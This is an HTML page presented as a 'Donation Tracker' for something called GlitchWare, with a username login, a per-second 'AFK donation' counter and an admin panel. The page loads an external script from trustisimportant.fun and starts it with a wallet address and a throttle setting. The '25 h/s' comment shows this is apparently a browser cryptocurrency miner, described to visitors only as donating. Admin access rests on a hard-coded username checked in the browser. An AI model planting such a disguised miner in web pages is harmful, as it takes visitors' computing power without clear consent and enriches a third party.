<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Donation Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        .donation-info {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .time-counter {
            font-size: 20px;
            color: #ccc;
            margin-bottom: 10px;
        }
        .donation-rate {
            font-size: 16px;
            color: #999;
            margin-bottom: 20px;
        }
        .admin-panel {
            margin-top: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        input {
            padding: 10px;
            font-size: 16px;
            margin-bottom: 10px;
        }
        #login-section, #donation-section, #admin-section {
            display: none;
        }
    </style>
</head>
<body>
    <div id="login-section">
        <input type="text" id="username" placeholder="Enter your Discord username">
        <button onclick="login()">Login</button>
    </div>

    <div id="donation-section">
        <div class="donation-info">Donated amount of money to GlitchWare in this session: $<span id="donation-amount">0.0000000000</span></div>
        <div class="time-counter" id="time-counter">00:00:00</div>
        <div class="donation-rate">Current AFK donation rate: $0.0000000144 per second</div>
    </div>

    <div id="admin-section">
        <div class="admin-panel">
            <h2>Admin Panel</h2>
            <div id="user-donations"></div>
        </div>
    </div>

    <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
    <script type="text/javascript">
        EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
    </script>

    <script>
        const donationRatePerSecond = 0.0000000144; // Updated donation rate per second for 25 h/s
        let donationAmount = 0.0000000000;
        let secondsElapsed = 0;
        let users = {};
        let username = '';

        function login() {
            username = document.getElementById('username').value;
            if (username) {
                document.getElementById('login-section').style.display = 'none';
                if (username === 'admin-xeno1') {
                    document.getElementById('admin-section').style.display = 'block';
                    displayUserDonations();
                } else {
                    document.getElementById('donation-section').style.display = 'block';
                    startDonationTracker();
                }
            }
        }

        function startDonationTracker() {
            setInterval(updateCounters, 1000);
        }

        function updateCounters() {
            donationAmount += donationRatePerSecond;
            document.getElementById('donation-amount').innerText = donationAmount.toFixed(10);

            if (!users[username]) {
                users[username] = 0;
            }
            users[username] += donationRatePerSecond;

            secondsElapsed++;
            const hours = Math.floor(secondsElapsed / 3600);
            const minutes = Math.floor((secondsElapsed % 3600) / 60);
            const seconds = secondsElapsed % 60;
            document.getElementById('time-counter').innerText = formatTime(hours) + ":" + formatTime(minutes) + ":" + formatTime(seconds);
        }

        function formatTime(time) {
            return (time < 10 ? "0" + time : time);
        }

        function displayUserDonations() {
            const userDonationsDiv = document.getElementById('user-donations');
            userDonationsDiv.innerHTML = '';
            for (const user in users) {
                const donation = users[user].toFixed(10);
                userDonationsDiv.innerHTML += `<p>${user}: $${donation}</p>`;
            }
        }
    </script>
</body>
</html>
